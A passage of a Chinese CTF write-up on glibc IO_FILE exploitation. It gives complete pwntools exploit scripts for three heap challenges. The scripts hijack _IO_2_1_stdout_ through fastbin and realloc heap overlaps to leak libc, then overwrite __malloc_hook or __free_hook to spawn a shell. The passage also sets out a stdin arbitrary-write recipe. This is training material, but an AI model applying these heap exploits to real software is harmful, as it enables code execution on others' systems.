punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_cur_column <span class="token operator">&amp;&amp;</span> count<span class="token punctuation">)</span>    fp<span class="token operator">-></span>_cur_column <span class="token operator">=</span> <span class="token function">_IO_adjust_column</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_cur_column <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> count<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">_IO_setg</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  fp<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  fp<span class="token operator">-></span>_IO_write_end <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span>               <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF <span class="token operator">|</span> _IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token operator">?</span> fp<span class="token operator">-></span>_IO_buf_base <span class="token punctuation">:</span> fp<span class="token operator">-></span>_IO_buf_end<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>不知道libc_base的情况下,利用unsortedbin遗留的指针部分覆写劫持stdout.</p><h3 id="例题-de1ctf-2019-weapon"><a href="#例题-de1ctf-2019-weapon" class="headerlink" title="例题 de1ctf_2019_weapon"></a>例题 de1ctf_2019_weapon</h3><p>glibc2.23,保护全开,限制堆块小于0x60,存在uaf,不存在show功能.</p><p>先fastbin attack篡改一个chunk的size使得能被放进unsortedbin<br>再放回fastbin.<br>    最开始想的方案是再篡改unsortedbin chunk的size为0x71然后delete,但是free操作会清空fd,gg<br>    所以采用free另一个0x71的chunk改fd为unsortedbin chunk.<br>然后篡改stdout泄露libc</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#unsortedbin</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'geban'</span><span class="token punctuation">)</span>  delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>b<span class="token string">'\x20'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#放进unsortedbin</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>fake_size_addr <span class="token operator">=</span> <span class="token number">0x7ffff7dd25e5</span>fake_chunk_addr <span class="token operator">=</span> <span class="token number">0x7ffff7dd25dd</span> <span class="token comment" spellcheck="true">#stdout-0x43</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>b<span class="token string">'\xdd\x25'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x40'</span><span class="token punctuation">)</span>  add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>fake_stdout <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token number">0xfbad1800</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>    b<span class="token string">'\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>fake_stdoutadd<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4600</span>leak_libc<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">,</span>libc_base<span class="token operator">+</span><span class="token number">0x3c4600</span><span class="token operator">+</span><span class="token number">0xa3</span><span class="token operator">-</span><span class="token number">131</span><span class="token punctuation">)</span>malloc_hook_chunk <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x23</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>b<span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">11</span><span class="token punctuation">,</span>libc_base<span class="token operator">+</span>og<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>realloc_addr<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>b<span class="token string">'choice >> '</span><span class="token punctuation">,</span>b<span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>b<span class="token string">'wlecome input your size of weapon: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>b<span class="token string">'input index:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="例题-nsctf-online-2019-pwn1"><a href="#例题-nsctf-online-2019-pwn1" class="headerlink" title="例题 nsctf_online_2019_pwn1"></a>例题 nsctf_online_2019_pwn1</h3><p>glibc2.23,保护全开,不限制堆块大小,不存在uaf.编辑存在offbyone.不存在show</p><p>offbyone制造堆块重叠,利用unsortedbin残留指针fastbin attack劫持_IO_2_1_stdout.<br>问题在于,add取出的时候会memset清空堆块,有字节错位的堆块在_IO_2_1_stdout-0x43的位置,用户域在-0x33的位置,取0x60的堆块将会破坏_IO_write_ptr以致卡死在input前的puts函数,所以这里应取0x59的堆块</p><p>(大致思路如此,由于在制造堆块重叠打fastbin attack时我的做法已经覆写过一次,所以打通概率只有1/256)</p><pre class=" language-python"><code class="language-python">og <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45206</span><span class="token punctuation">,</span><span class="token number">0x4525a</span><span class="token punctuation">,</span><span class="token number">0xef9f4</span><span class="token punctuation">,</span><span class="token number">0xf0897</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'geban'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#5</span>  delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x190</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x280</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x101</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">,</span>    <span class="token number">0x91</span><span class="token punctuation">,</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span>    <span class="token string">'\x90\x50'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">,</span>    <span class="token number">0x71</span><span class="token punctuation">,</span>    <span class="token string">'\xdd\x25'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>fake_stdout <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>fake_stdoutadd<span class="token punctuation">(</span><span class="token number">0x59</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span>stdout_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">132</span>leak_libc<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">,</span>stdout_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">,</span>    <span class="token number">0x71</span><span class="token punctuation">,</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">,</span>    <span class="token number">0x71</span><span class="token punctuation">,</span>    malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>add<span class="token punctuation">(</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">11</span><span class="token punctuation">,</span>libc_base<span class="token operator">+</span>og<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>realloc_addr<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'exit'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'Input the size:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>由于这题的idx没有判断正负,可以直接上溢到bss段的_IO_2_1_stdout_指针达到篡改的目的</p><h3 id="例题-roarctf-2019-realloc-magic-0"><a href="#例题-roarctf-2019-realloc-magic-0" class="headerlink" title="例题 roarctf_2019_realloc_magic 0"></a>例题 roarctf_2019_realloc_magic 0</h3><p>主要是学一下realloc函数的用法吧.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202303011006285.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202303011006406.png"></p><h3 id="TWCTF-online-2019-asterisk-alloc"><a href="#TWCTF-online-2019-asterisk-alloc" class="headerlink" title="TWCTF_online_2019_asterisk_alloc"></a>TWCTF_online_2019_asterisk_alloc</h3><p>glibc2.27,保护全开,可以无限realloc和各一次的malloc、colloc,不存在编辑功能,delete未清空指针.<br>realloc制造堆块重叠,常规劫持_IO_2_1_stdout.这里要注意一点,取出stdout时只能用malloc,若使用realloc时会在下次分配时free掉stdout,而stdout的nextsize通不过检查.</p><p>部分覆写的时候,b’\x60\x07’是不行的,估计跟固定偏移有关…</p><pre class=" language-python"><code class="language-python">realloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span>b<span class="token string">'\x60\xe7'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>stdout_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">131</span>leak_libc<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">,</span>stdout_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span>free_hook_addr<span class="token number">-0x8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>b<span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>  io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="stdin任意读写"><a href="#stdin任意读写" class="headerlink" title="stdin任意读写"></a>stdin任意读写</h2><ul><li>设置 <code>_IO_read_end</code> 等于 <code>_IO_read_ptr</code></li><li>设置 <code>_flag &amp;~ _IO_NO_READS</code> 即 <code>_flag &amp;~ 0x4</code></li><li>设置 <code>_fileno</code> 为 0</li><li>设置 <code>_IO_buf_base</code> 为 <code>write_start</code> ， <code>_IO_buf_end</code> 为 <code>write_end</code> 且使得 <code>_IO_buf_end-_IO_buf_base</code> 大于fread要读的数据<br>以fgets函数为例</li></ul><h3 id="fgets源码分析"><a href="#fgets源码分析" class="headerlink" title="fgets源码分析"></a>fgets源码分析</h3><p>这是主要的调用流程<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202303031227056.png"><br>关键函数在这里:</p><pre class=" language-c"><code class="language-c">_IO_size_t<span class="token function">_IO_getline_info</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> _IO_size_t n<span class="token punctuation">,</span> <span class="token keyword">int</span> delim<span class="token punctuation">,</span>          <span class="token keyword">int</span> extract_delim<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>eof<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>eof <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token operator">*</span>eof <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token function">_IO_fwide</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token string">"判断输入缓冲区中是否有数据"</span>      _IO_ssize_t len <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">__uflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>eof<span class="token punctuation">)</span>        <span class="token operator">*</span>eof <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> delim<span class="token punctuation">)</span>        <span class="token punctuation">{</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">_IO_sputbackc</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">++</span>len<span class="token punctuation">;</span>          <span class="token keyword">return</span> ptr <span class="token 